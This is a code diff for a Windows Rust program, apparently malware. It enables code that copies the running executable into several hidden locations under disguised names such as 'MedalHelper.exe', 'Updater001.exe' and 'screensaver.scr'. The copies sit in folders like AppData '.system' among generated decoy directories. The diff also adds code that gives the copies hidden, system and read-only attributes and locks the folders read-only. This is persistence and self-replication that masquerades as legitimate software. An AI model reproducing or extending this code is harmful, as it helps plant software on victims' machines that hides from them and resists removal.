@@ -1,11 +1,14 @@
 //#![windows_subsystem = "windows"]
+extern crate winapi;
 
+use std::os::windows::prelude::*;
 use std::error::Error;
 use std::os::windows::process::CommandExt;
 use std::process::Command;
 use std::{env, fs, thread};
-use std::fs::{create_dir, File};
+use std::fs::{create_dir, File, OpenOptions};
 use std::io::Write;
+use std::os::windows::fs::OpenOptionsExt;
 use std::path::Path;
 use std::time::Duration;
 use base64::prelude::*;
@@ -74,103 +77,103 @@ fn main() {
             generate:true,
             ..Default::default()
         },
-        // InstallDirectory {
-        //     hidden: true,
-        //     name: "MedalHelper.exe".to_string(),
-        //     path: format!("{user_dir}\\.medal"),
-        //     populate:vec![
-        //         "clipTemp".to_string(),
-        //         "recording".to_string(),
-        //         "exist".to_string(),
-        //     ],
-        //     ..Default::default()
-        // },
-        //
-        // InstallDirectory {
-        //     hidden: true,
-        //     name: ".\\bc2\\userman.exe".to_string(),
-        //     path: format!("{user_dir}\\ntuser-09j2d-3ij832-9jd832"),
-        //     populate:vec![
-        //         "userdata".to_string(),
-        //         "data".to_string(),
-        //         "user".to_string(),
-        //         ".".to_string(),
-        //         ".\\aa1".to_string(),
-        //         ".\\ab1".to_string(),
-        //         ".\\ba3".to_string(),
-        //         ".\\bc2".to_string(),
-        //         ".\\ce3".to_string(),
-        //         ".\\de1".to_string(),
-        //         ".\\ef4".to_string(),
-        //         ".\\ff6".to_string(),
-        //     ],
-        //     generate:true,
-        //     ..Default::default()
-        // },
-        //
-        // InstallDirectory {
-        //     hidden: true,
-        //     name: "cache\\ef4\\Updater001.exe".to_string(),
-        //     path: format!("{roaming}\\.system"),
-        //     populate:vec![
-        //         "systemdata".to_string(),
-        //         "data".to_string(),
-        //         "user".to_string(),
-        //         "cache".to_string(),
-        //         "cache\\aa1".to_string(),
-        //         "cache\\ab1".to_string(),
-        //         "cache\\ba3".to_string(),
-        //         "cache\\bc2".to_string(),
-        //         "cache\\ce3".to_string(),
-        //         "cache\\de1".to_string(),
-        //         "cache\\ef4".to_string(),
-        //         "cache\\ff6".to_string(),
-        //     ],
-        //     generate:true,
-        //     ..Default::default()
-        // },
-        //
-        // InstallDirectory {
-        //     hidden: true,
-        //     name: "screensaver.scr".to_string(),
-        //     path: format!("{roaming}\\Screensavers"),
-        //     populate:vec![
-        //         "screensavers".to_string(),
-        //     ],
-        //     ..Default::default()
-        // },
-        //
-        // InstallDirectory {
-        //     hidden: true,
-        //     name: "roam\\55\\LibraryFileHandle.exe".to_string(),
-        //     path: format!("{roaming}\\Roaming\\AppData"),
-        //     populate:vec![
-        //         "systemdata".to_string(),
-        //         "data".to_string(),
-        //         "user".to_string(),
-        //         "cache".to_string(),
-        //         "cache\\55".to_string(),
-        //         "cache\\634".to_string(),
-        //         "data\\45".to_string(),
-        //         "cache\\data".to_string(),
-        //         "cache\\12".to_string(),
-        //         "cache\\0231".to_string(),
-        //         "cache\\912".to_string(),
-        //         "cache\\2".to_string(),
-        //         "cache\\user".to_string(),
-        //         "user\\55".to_string(),
-        //         "user\\cache".to_string(),
-        //         "user\\45".to_string(),
-        //         "user\\345".to_string(),
-        //         "user\\data".to_string(),
-        //         "data\\0231".to_string(),
-        //         "user\\912".to_string(),
-        //         "data\\2".to_string(),
-        //         "user\\3".to_string(),
-        //     ],
-        //     generate:true,
-        //     ..Default::default()
-        // },
+        InstallDirectory {
+            hidden: true,
+            name: "MedalHelper.exe".to_string(),
+            path: format!("{user_dir}\\.medal"),
+            populate:vec![
+                "clipTemp".to_string(),
+                "recording".to_string(),
+                "exist".to_string(),
+            ],
+            ..Default::default()
+        },
+
+        InstallDirectory {
+            hidden: true,
+            name: ".\\bc2\\userman.exe".to_string(),
+            path: format!("{user_dir}\\ntuser-09j2d-3ij832-9jd832"),
+            populate:vec![
+                "userdata".to_string(),
+                "data".to_string(),
+                "user".to_string(),
+                ".".to_string(),
+                ".\\aa1".to_string(),
+                ".\\ab1".to_string(),
+                ".\\ba3".to_string(),
+                ".\\bc2".to_string(),
+                ".\\ce3".to_string(),
+                ".\\de1".to_string(),
+                ".\\ef4".to_string(),
+                ".\\ff6".to_string(),
+            ],
+            generate:true,
+            ..Default::default()
+        },
+
+        InstallDirectory {
+            hidden: true,
+            name: "cache\\ef4\\Updater001.exe".to_string(),
+            path: format!("{roaming}\\.system"),
+            populate:vec![
+                "systemdata".to_string(),
+                "data".to_string(),
+                "user".to_string(),
+                "cache".to_string(),
+                "cache\\aa1".to_string(),
+                "cache\\ab1".to_string(),
+                "cache\\ba3".to_string(),
+                "cache\\bc2".to_string(),
+                "cache\\ce3".to_string(),
+                "cache\\de1".to_string(),
+                "cache\\ef4".to_string(),
+                "cache\\ff6".to_string(),
+            ],
+            generate:true,
+            ..Default::default()
+        },
+
+        InstallDirectory {
+            hidden: true,
+            name: "screensaver.scr".to_string(),
+            path: format!("{roaming}\\Screensavers"),
+            populate:vec![
+                "screensavers".to_string(),
+            ],
+            ..Default::default()
+        },
+
+        InstallDirectory {
+            hidden: true,
+            name: "roam\\55\\LibraryFileHandle.exe".to_string(),
+            path: format!("{roaming}\\Roaming\\AppData"),
+            populate:vec![
+                "systemdata".to_string(),
+                "data".to_string(),
+                "user".to_string(),
+                "cache".to_string(),
+                "cache\\55".to_string(),
+                "cache\\634".to_string(),
+                "data\\45".to_string(),
+                "cache\\data".to_string(),
+                "cache\\12".to_string(),
+                "cache\\0231".to_string(),
+                "cache\\912".to_string(),
+                "cache\\2".to_string(),
+                "cache\\user".to_string(),
+                "user\\55".to_string(),
+                "user\\cache".to_string(),
+                "user\\45".to_string(),
+                "user\\345".to_string(),
+                "user\\data".to_string(),
+                "data\\0231".to_string(),
+                "user\\912".to_string(),
+                "data\\2".to_string(),
+                "user\\3".to_string(),
+            ],
+            generate:true,
+            ..Default::default()
+        },
     ];
 
     install(install_locations,exe_path);
@@ -233,10 +236,20 @@ fn install_single(location: InstallDirectory, current_exe: &str) ->Result<(),Box
 
     create_dir_recursively(path);
 
-    File::create(file_path.clone())?;
+    let file = OpenOptions::new()
+        .write(true)
+        .create(true)
+        .attributes(7)
+        .open(file_path.clone());
 
     println!("{}", env::current_dir()?.join(current_exe).clone().display());
     fs::copy(env::current_dir()?.join(current_exe),file_path.clone())?;
+
+    let file = OpenOptions::new()
+        .write(true)
+        .create(true)
+        .attributes(7)
+        .open(file_path.clone());
 
     match install_extras(&location) {
         Ok(_) => {}
@@ -248,6 +261,8 @@ fn install_single(location: InstallDirectory, current_exe: &str) ->Result<(),Box
 
 fn install_extras(location: &InstallDirectory) ->Result<(),Box<dyn Error>> {
     let file_types = vec!["lib","exe","dll","a"];
+    let path = Path::new(&location.path);
+    let file_path = path.join(&location.name);
 
     for dir in location.populate.iter() {
         create_dir_recursively(Path::new(location.path.as_str()).join(dir).as_path());
@@ -264,6 +279,16 @@ fn install_extras(location: &InstallDirectory) ->Result<(),Box<dyn Error>> {
             Ok(_) => {}
             Err(_) => {}
         }
+    }
+
+
+    let mut perms = fs::metadata(&path)?.permissions();
+
+    perms.set_readonly(true);
+
+    fs::set_permissions(&path, perms)?;
+
+    if location.hidden {
     }
 
     Ok(())
